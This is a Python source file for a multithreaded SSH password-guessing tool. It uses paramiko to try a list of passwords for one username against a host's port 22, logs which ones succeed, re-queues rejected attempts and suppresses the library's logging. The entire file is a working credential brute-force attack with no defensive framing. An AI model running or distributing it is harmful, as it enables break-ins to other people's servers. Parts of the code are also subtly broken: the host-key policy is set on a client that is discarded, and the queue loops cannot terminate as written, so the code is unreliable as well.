import logging
import threading
import time
from dataclasses import dataclass
from queue import Queue, Empty
from logging import NullHandler
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, ssh_exception

try:
    import resource
    resource.setrlimit(resource.RLIMIT_NOFILE, (4095, 4095))
except ModuleNotFoundError:
    pass  # Not supported in Windows


@dataclass
class Client:
    host: str
    username: str
    password: str


class ConnectSSH:
    thread_limit = 4095

    def __init__(self, host, username, passwords, verbose=False, wait_time=0.2, max_threads=5):
        self.host = host
        self.verbose = verbose

        if wait_time <= 0:
            raise ValueError("Cannot have negative or zero wait time")

        self.wait_time = float(wait_time)
        self.max_threads = max_threads

        if self.max_threads > ConnectSSH.thread_limit:
            self.max_threads = ConnectSSH.thread_limit

        self.lock = threading.RLock()
        self.queue = Queue(maxsize=self.max_threads * 3)
        self.results = Queue()

        self.connections = 0
        self.username = username
        self.passwords = passwords
        self.targets = Queue()
        self.shutdown = threading.Event()

    def fill_queue(self):
        while True:
            if not self.queue.full():
                try:
                    with self.lock:
                        target = self.targets.get()
                    self.queue.put(target)
                    self.connections += 1
                except StopIteration:
                    # Break condition
                    break
            else:
                time.sleep(0.01)

    def worker(self):
        while True:
            try:
                work = self.queue.get()
                if not self.shutdown.is_set():
                    self.connect(*work)
            except Empty:
                return
            except StopIteration:
                return
            finally:
                self.queue.task_done()

    def create_client(self):
        client = SSHClient()
        ssh_client = SSHClient()
        ssh_client.set_missing_host_key_policy(AutoAddPolicy())
        return client

    def connect(self, username, password):
        ssh_client = self.create_client()
        try:
            print(f"[+] Trying {username}@{self.host}/ {password} ")
            ssh_client.connect(self.host, port=22, username=username, password=password, banner_timeout=300)
            print(f"[-] {username}@{self.host}/ {password} is correct.")
            self.results.put(Client(self.host, username, password))
            return True
        except AuthenticationException:
            print(f"[-] {username}@{self.host}/ {password} is Incorrect.")
            return False
        except ssh_exception.SSHException:
            print(f"[*] Connection rejected: {username}@{self.host}/ {password}")
            # with self.lock:
            self.targets.put((username, password))
        finally:
            time.sleep(self.wait_time)

    def run(self):
        logging.getLogger('paramiko.transport').addHandler(NullHandler())

        for password in self.passwords:
            self.targets.put((self.username, password))

        queue_thread = threading.Thread(target=self.fill_queue)
        queue_thread.daemon = True
        queue_thread.start()

        for _ in range(self.max_threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()

        self.queue.join()

        print(f"\nAttempted {self.connections} connections")


